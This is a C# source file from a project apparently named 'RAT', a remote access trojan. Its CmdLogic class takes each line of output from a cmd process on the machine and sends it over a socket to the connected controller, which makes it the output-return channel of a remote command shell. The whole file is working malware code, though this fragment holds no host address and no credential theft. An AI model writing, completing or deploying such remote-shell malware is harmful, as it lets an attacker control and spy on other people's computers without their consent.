using RAT.src.Interfaces;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace RAT.src.Cmd
{
    /// <summary>
    /// Logic related to windows cmd.
    /// </summary>
    public class CmdLogic : ICmdLogic
    {
        private ISocketConnectionSendingLogic _socketConnectionSendingLogic { get; }
        private ISocketStateLogic _stateLogic { get; }

        /// <summary>
        /// Logic related to cmd.
        /// </summary>
        /// <param name="sendingLogic">Socket sending logic.</param>
        /// <param name="stateLogic">Our client state logic.</param>
        public CmdLogic(
            ISocketConnectionSendingLogic sendingLogic,
            ISocketStateLogic stateLogic)
        {
            _socketConnectionSendingLogic = sendingLogic;
            _stateLogic = stateLogic;
        }

        /// <summary>
        /// This will send command execution output result to client regardless of output being error or not.
        /// </summary>
        /// <param name="sendingProcess">Sender.</param>
        /// <param name="outLine">Event sender's data.</param>
        public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            var state = _stateLogic.State;

            if (outLine.Data != null &&
                state.DataArray != null &&
                !state.ClientCmdProcess.HasExited)
            {
                string cleanCmd = CmdHelper.GetFormattedCmdForResponse(outLine.Data);

                state.ClientSocket.BeginSend(
                    Encoding.ASCII.GetBytes(cleanCmd),
                    0,
                    cleanCmd.Length,
                    SocketFlags.None,
                    _socketConnectionSendingLogic.OnSend,
                    state.ClientSocket);
            }
        }
    }
}